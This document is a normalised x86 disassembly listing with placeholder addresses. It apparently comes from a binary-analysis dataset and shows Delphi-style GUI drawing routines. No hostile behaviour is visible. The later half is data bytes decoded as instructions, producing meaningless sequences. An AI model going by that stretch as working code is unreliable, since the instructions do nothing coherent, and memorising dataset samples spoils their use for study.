mov edx [ eax + 0x294 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
call sub_4237e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x298 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x14 ]
call sub_423fb4
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff000011
call sub_4237e8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
add eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
test bl bl
jne r-xdata
push ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_46ad44
mov ecx eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_46aa08
jmp r-xdata
sub_46a9ac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov eax ebx
call sub_46b0ec
test al al
jne r-xdata
mov edx ebp
mov eax ebx
call sub_442078
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov eax ebx
call sub_46a788
sub [ edi + 0x24 ] eax
mov eax ebx
call sub_46a788
add [ edi + 0x1c ] eax
jmp r-xdata
sub_46aa08
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] cl
mov esi eax
xor edi edi
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
add edx eax
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
adc edx 0x0
add edx eax
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x30 ]
add eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
add eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov ebx [ esi + 0x228 ]
cmp [ esi + 0x281 ] 0x0
je r-xdata
adc edx 0x0
call sub_43936c
call sub_43944c
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateRectRgn
mov edi eax
push edi
mov eax ebx
call sub_4248b4
push eax
call GetClipRgn
mov eax [ ebp - 0x24 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x28 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x2c ]
add eax 0x2
push eax
mov eax [ ebp - 0x30 ]
add eax 0x2
push eax
call CreateRectRgn
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4248b4
push eax
call SelectClipRgn
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x408
mov [ ebp - 0x8 ] 0x400
jmp r-xdata
call sub_43936c
lea ecx [ ebp - 0x3c ]
mov dl 0x12
call sub_439618
jmp r-xdata
call sub_43936c
lea ecx [ ebp - 0x3c ]
mov dl 0xf
call sub_439618
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x4
lea eax [ ebp - 0x30 ]
push eax
mov eax ebx
call sub_4248b4
push eax
call DrawFrameControl
or [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax ebx
call sub_4248b4
push eax
call sub_43936c
lea ecx [ ebp - 0x3c ]
pop edx
call sub_439508
jmp r-xdata
call sub_43936c
lea ecx [ ebp - 0x3c ]
mov dl 0x1a
call sub_439618
call sub_43936c
lea ecx [ ebp - 0x3c ]
mov dl 0x17
call sub_439618
jmp r-xdata
call sub_43936c
lea ecx [ ebp - 0x3c ]
mov dl 0x16
call sub_439618
jmp r-xdata
call sub_43936c
lea ecx [ ebp - 0x3c ]
mov dl 0x13
call sub_439618
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
mov eax ebx
call sub_4248b4
push eax
call SelectClipRgn
push edi
call DeleteObject
mov eax [ ebx + 0x14 ]
call sub_4240c8
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x14 ]
call sub_423fac
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_423ccc
mov edi eax
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_4240d0
mov edx 0xff000010
mov eax [ ebx + 0x10 ]
call sub_423cd4
mov eax [ ebp - 0x28 ]
dec eax
push eax
mov eax [ ebp - 0x24 ]
dec eax
push eax
mov ecx [ ebp - 0x2c ]
inc ecx
mov edx [ ebp - 0x30 ]
inc edx
mov eax ebx
call sub_4244a4
mov dl [ ebp - 0x9 ]
mov eax [ ebx + 0x14 ]
call sub_4240d0
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_423fb4
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_423cd4
cmp [ esi + 0x281 ] 0x0
je r-xdata
sub_46ac64
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_46ad44
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
call sub_46af2c
mov [ eax + 0x8 ] bl
mov edx esi
mov eax edi
call sub_46ac94
sub_46ac94
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46b0ec
test al al
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebx
call sub_441938
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
mov eax ebx
call sub_46a788
mov edx [ esp + 0x8 ]
sub edx eax
mov [ esp ] edx
mov eax ebx
call sub_46a788
add eax [ esp ]
mov [ esp + 0x8 ] eax
jmp r-xdata
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call InvalidateRect
mov eax ebx
call sub_44f2dc
push eax
call UpdateWindow
sub_46ad18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46afe0
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46af2c
mov al [ eax + 0x9 ]
xor al 0x1
pop esi
pop ebx
retn
sub_46ad44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46afe0
test al al
je r-xdata
mov eax [ r-xdata ]
call sub_46a604
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46af2c
mov al [ eax + 0x8 ]
pop esi
pop ebx
retn
sub_46ad74
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi ] 0x20
jne r-xdata
mov edx esi
mov eax ebx
call sub_4422ac
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax ebx
call sub_46ae74
sub_46ada0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
push edi
push esi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44a0bc
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax edi
call sub_416cac
lea edx [ ebp - 0x10 ]
mov cl 0x1
mov eax ebx
call sub_4418ac
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46ad18
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_441938
mov esi [ ebp - 0x18 ]
mov eax ebx
call sub_46a788
sub esi eax
sub edi esi
test edi edi
jle r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_441938
sub edi [ ebp - 0x20 ]
mov eax ebx
call sub_46a788
cmp edi eax
jge r-xdata
mov eax ebx
call sub_46a788
cmp edi eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46ae74
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46ae74
sub_46ae74
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_46ad18
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_46ad44
mov edx eax
sub dl 0x1
jb r-xdata
cmp [ ebx + 0x280 ] 0x0
je r-xdata
je r-xdata
mov al 0x1
jmp r-xdata
mov al 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
dec dl
je r-xdata
mov ecx eax
mov edx esi
mov eax ebx
call sub_46ac64
mov eax ebx
mov si 0xffad
call sub_40348c
mov al 0x1
jmp r-xdata
sub_46af04
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
mov edx esi
mov eax ebx
call sub_46afe0
test al al
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46af2c
mov edi [ eax + 0x4 ]
sub_46af2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46af4c
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46afb8
sub_46af4c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4410b4
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b888
call sub_403a44
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
xor ebx ebx
sub_46afb8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov ecx esi
mov edx edi
mov eax ebx
call sub_4410d4
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_46aff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46afe0
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_46af2c
mov [ eax + 0x4 ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_46b024
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
call sub_441130
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_46af2c
call sub_403290
mov edx ebx
mov eax edi
call sub_46afe0
test al al
je r-xdata
sub_46b068
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46afe0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_441110
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46af2c
call sub_403290
sub_46b0ac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx ebp
mov eax edi
call sub_44e530
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_46af4c
call sub_403290
inc esi
dec ebx
jne r-xdata
sub_46b0ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46afe0
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_46af2c
mov al [ eax + 0xa ]
pop esi
pop ebx
retn
sub_46b13c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b161
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b168
retn
sub_46b20c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b231
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b238
retn
sub_46b2c0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx - 0x4c83ffba ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x4d ] bl
inc esi
add [ eax - 0x4d ] ch
inc esi
add al cl
add [ eax ] al
add ah dl
imul eax [ ecx ] sub_420e84
int3
sub_46b2ed
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
int3
sub_46b559
mov ah 0x46
add al dl
push 0x41
add [ edi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
clc
pushad
inc ecx
add [ eax ] dh
add [ eax ] al
[ ecx + edx * 8 + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add eax 0x656e694c
jae r-xdata
add [ esi + esi * 4 + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov dh 0x46
add [ esi + 0x480046b6 ] bl
add [ eax ] al
add ah dl
imul eax [ ecx ] sub_420e84
int3
mov bl 0x46
add [ eax + eax ] dh
add bh bh
add al 0xd0
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070004 ] al
inc ebx
outsd
outsb
jbe r-xdata
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x40109400
add [ ecx + edx * 8 + 0x46 ] ch
add [ eax + 0x10046d1 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040002 ] al
js r-xdata
adc [ eax ] al
cmp [ eax ] al
add bh bh
mov eax ss
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070005 ] al
dec ecx
je r-xdata
inc eax
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc esp
fadd [ esi ]
outsb
inc ebx
push 0x65676e61
lea eax [ eax ]
pushad
mov dh 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
adc al 0x56
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080006 ] al
sub_46b700
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
pop es
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
adc ch 0x46
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
xor [ edx + r--data ] 0x0
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
push cs
dec edi
outsb
inc ebp
js r-xdata
xor [ eax ] al
add bh bh
sbb dh dl
jb r-xdata
add al bl
xlat
inc esi
add [ ebx + ecx + 0x42 ] dh
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ esi + ecx - 0x2acbffbe ] ah
inc esi
add [ ecx ] al
add bh ch
arpl [ ebp + 0x74 ] si
dec ebp
popad
arpl [ edx + 0x6f ] si
nop
nop
mov bh 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
mov bh 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
mov bh 0x46
add al cl
mov bh 0x46
add [ eax + eax ] cl
add ah dl
imul eax [ ecx ] sub_420e84
int3
jbe r-xdata
je r-xdata
adc al 0x56
jb r-xdata
add [ ebx ] 0x0
insd
nop
fdiv [ edi + 0xe070046 ]
push esp
inc esp
push ebx
jb r-xdata
je r-xdata
nop
clc
mov eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx - 0x46b7ffba ] bh
add [ eax ] bh
add [ eax ] al
push esi
inc ecx
outsd
outsb
jbe r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
mov ecx r--data
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add [ eax ] ch
mov ecx 0xb9480046
inc esi
add [ ecx ] al
clc
pushad
inc ecx
add [ eax ] dh
add [ eax ] al
[ eax ]
salc
add [ 0x656e694c ] al
jae r-xdata
jb r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
inc esp
xlat
inc esi
add [ esi ] cl
push esp
inc esp
push ebx
jb r-xdata
push cs
inc edx
add [ edx * 8 + 0x10046 ] dh
out dx eax
js r-xdata
adc [ eax ] al
rcl ch 0x46
add ah ch
aad 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040003 ] al
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
add [ eax ] al
add [ 0x6e4f0800 ] 0x43
push 0x65676e61
adc al 0x56
add al 0x54
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
add [ esi + ecx - 0x40efffbe ] ah
inc esi
add [ esi ] cl
inc edx
inc esi
add [ eax + eax ] cl
add ah dl
imul eax [ ecx ] sub_420e84
int3
ror [ eax - 0x47 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050004 ] al
imul ebp [ esi + 0x65 ] 0x41561473
insd
nop
mov bh 0x46
add al dl
push 0x41
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x46b6b000
add [ eax + eax ] dh
add bh bh
mov al 0xd5
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0002 ] al
jb r-xdata
push esp
inc esp
dec ebp
jb r-xdata
mov eax 0x6ad00046
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
mov al 0xb9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046b9 ] dh
add [ eax ] al
add al dl
jo r-xdata
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ edx ] cl
dec edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x46 ] cl
inc esi
add [ eax ] al
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add bh bl
inc esi
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
inc ebp
inc esp
inc ebp
jb r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ esi + ecx - 0x2137ffbe ] ah
inc esi
add [ esi ] cl
inc edx
sbb cl 0x46
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
jb r-xdata
add [ edi ] al
pop es
inc esi
ror [ eax ] 0xba
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov edx 0xba5c0046
inc esi
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ eax ] al
add [ esi ] cl
mov ebx r--data
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ esi + ecx - 0x26c3ffbe ] ah
inc esi
inc edx
in al 0xd1
inc esi
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
or al 0x89
inc ecx
add [ esi ] cl
add [ eax ] al
jb r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
insd
nop
pop esp
mov edx 0xc070046
push esp
inc esp
push ebx
jb r-xdata
call sub_408d00
jmp r-xdata
insd
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x140046bb ] ch
add [ eax ] al
add [ eax - 0x3fffbea4 ] ch
outsd
outsb
jbe r-xdata
add [ eax ] dh
or al [ edx ]
je r-xdata
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bcf9
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
add al bl
pop es
inc edx
add ah dl
xor al 0x40
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
and [ ebx + 0xc070046 ] bh
push esp
inc esp
push ebx
jb r-xdata
int3
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
sar [ ebx + 0xb070046 ] 0x54
inc esp
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xbb906d65
inc esi
add [ ebx * 2 + 0x10041 ] bl
push es
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
jb r-xdata
inc ecx
add [ ebx + ecx + 0x42 ] ah
inc ecx
add [ edx + ecx - 0x76f3ffbe ] cl
insd
or [ edx + 0x6ad00046 ] bh
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
int3
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc ecx
add al al
outsd
outsb
jbe r-xdata
add [ esi ] cl
mov edx 0x6ad00046
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
nop
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov ebx 0xbbc00046
inc esi
add [ eax ] al
add [ eax ] al
sub_46b748
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ edi + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ edi - 0x4837ffba ] 0x46
add [ eax + eax ] cl
add ah dl
imul eax [ ecx ] sub_420e84
int3
sub_46b86b
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0800
inc ebx
push 0x65676e61
adc al 0x56
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
je r-xdata
nop
clc
mov eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx - 0x46b7ffba ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
mov ecx r--data
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
add [ esi + ecx - 0x40efffbe ] ah
inc esi
add [ esi ] cl
inc edx
inc esi
add [ eax + eax ] cl
add ah dl
imul eax [ ecx ] sub_420e84
int3
ror [ eax - 0x47 ] 0x46
push esp
inc esp
dec ebp
jb r-xdata
mov eax 0x6ad00046
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
mov al 0xb9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046b9 ] dh
add [ eax ] al
add al dl
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x46 ] cl
inc esi
add [ eax ] al
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add bh bl
inc esi
